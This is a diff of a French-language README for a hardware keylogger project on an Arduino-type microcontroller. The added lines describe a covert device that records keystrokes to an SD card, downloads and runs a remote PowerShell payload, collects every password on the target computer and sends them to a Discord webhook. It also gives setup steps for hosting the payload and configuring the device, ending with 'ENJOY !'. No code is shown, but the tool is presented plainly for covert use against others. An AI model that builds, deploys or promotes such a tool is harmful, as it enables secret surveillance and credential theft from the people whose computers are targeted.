@@ -16,7 +16,7 @@
   <h3 align="center">Keylogger physique</h3>
 
   <p align="center">
-    Un keylogger matériel facile à utiliser pour surveiller les frappes au clavier.
+    Un keylogger matériel facile à utiliser pour surveiller les frappes au clavier et récupérer les mots de passes de l'ordinateur.
     <br />
    </p>
 </div>
@@ -24,6 +24,8 @@
 ## A propose du projet 
 
 Ce projet fournit un programme de keylogger physique, qui peut être utilisé pour surveiller et enregistrer les frappes au clavier d'un ordinateur. Il est conçu pour être discret et efficace, en enregistrant les données dans un fichier sur une carte SD.
+
+Le projet récupère également un payload sur un serveur distant et l'exécute. Une fois configuré, celui-ci récupère tous les mots de passe présent dans l'ordinateur et les envoies à un webhook discord. 
 
 
 ## Prérequis
@@ -34,6 +36,8 @@ Pour utiliser ce keylogger, vous aurez besoin de :
 * Une carte SD pour stocker les données enregistrées
 * logiciel [Arduino](https://www.arduino.cc/en/software)
 * Une bibliothèque Arduino pour la prise en charge des périphériques USB (USBHost_t36)
+* Une bibliothèque Arduino pour la prise en charge des cartes SD (SD)
+* un serveur distant (disord, vps ou autres)
 
 ## Installation
 
@@ -44,14 +48,22 @@ git clone https://github.com/nico-vrn/KeyLogger.git
 ```
 2. Ouvrez le projet dans l'IDE Arduino.
 3. Téléchargez et installez les bibliothèques nécessaires (USBHost_t36 et SD).
-4. Téléversez le code sur votre microcontrôleur.
+4. Modifier le fichier payload_vps.ps1 (ligne 5)
+5. Héberger le payload sur discord ou serveur distant
+6. Mettre le fichier payload_sd.txt sur la carte sd
+7. Modifier le fichier Keylogger.ino en conséquence (ligne 4 à 8)
+8. Modifier le fichier payload_vps.ps1 (ligne 5)
+9. Téléversez le code sur votre microcontrôleur.
+10. ENJOY !
 
 ## Fonctionnalités principales
 
 * Enregistrement discret des frappes au clavier
 * Stockage des données sur une carte SD
-* Facile à installer et à utiliser
-* Compatible avec une variété de microcontrôleurs
+* Téléchargement d'un payload sur un serveur distant
+* Exécution d'un payload sur l'ordinateur
+* Récupération des mots de passe de l'ordinateur
+* Envoie des mots de passe sur un webhook discord
 
 ## Contribution
 
